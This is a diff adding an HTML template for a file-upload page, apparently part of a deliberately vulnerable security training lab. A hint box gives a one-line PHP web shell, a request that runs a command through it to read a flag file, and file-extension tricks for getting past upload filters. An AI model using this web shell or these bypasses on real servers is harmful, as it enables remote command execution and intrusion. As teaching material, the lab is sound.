@@ -1,0 +1,53 @@
+{% extends "base.html" %}
+{% block title %}File Upload{% endblock %}
+{% block content %}
+<style>
+  .upload-page { max-width: 600px; margin: 40px auto; padding: 0 32px; }
+  .upload-area { border: 2px dashed var(--border); border-radius: 12px; padding: 48px; text-align: center; background: white; }
+  .upload-icon { font-size: 48px; margin-bottom: 16px; }
+  .upload-area h3 { margin-bottom: 8px; }
+  .upload-area p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+  .file-input-label { display: inline-block; padding: 10px 24px; background: var(--primary); color: white; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; }
+  .upload-btn { display: block; width: 100%; padding: 12px; background: var(--success); color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 16px; }
+  .result-box { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 8px; padding: 16px; margin-top: 16px; }
+  .vuln-hint { background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px; padding: 12px; font-size: 12px; color: #78350f; margin-bottom: 16px; }
+</style>
+
+<div class="upload-page">
+  <h1 style="font-size:28px;font-weight:700;margin-bottom:24px">📁 File Upload</h1>
+
+  <div class="vuln-hint">
+    🔍 <b>Lab Exercise:</b> Try uploading a PHP file!<br>
+    Create: <code>shell.php</code> with content: <code>&lt;?php system($_GET['cmd']); ?&gt;</code><br>
+    Then access: <code>/uploads/shell.php?cmd=cat+/flag.txt</code><br>
+    If .php is blocked, try: <code>shell.php.jpg</code>, <code>shell.phtml</code>, <code>shell.PHP</code>
+  </div>
+
+  <div class="upload-area">
+    <div class="upload-icon">📤</div>
+    <h3>Upload Your File</h3>
+    <p>Supported formats: JPG, PNG, GIF, PDF (max 10MB)</p>
+
+    <form method="POST" enctype="multipart/form-data">
+      <label class="file-input-label">
+        Choose File
+        <input type="file" name="file" style="display:none" onchange="this.nextElementSibling.textContent=this.files[0]?.name||'No file'">
+      </label>
+      <span style="display:block;margin-top:8px;font-size:13px;color:var(--text-muted)">No file selected</span>
+      <button class="upload-btn" type="submit">Upload</button>
+    </form>
+
+    {% if result %}
+    <div class="result-box">
+      <b>Upload Result:</b><br>
+      {{ result }}<br>
+      {% if '/uploads/' in result %}
+      <a href="{{ result.split(': ')[1] }}" target="_blank" style="color:var(--primary);font-size:13px">
+        → Access uploaded file
+      </a>
+      {% endif %}
+    </div>
+    {% endif %}
+  </div>
+</div>
+{% endblock %}
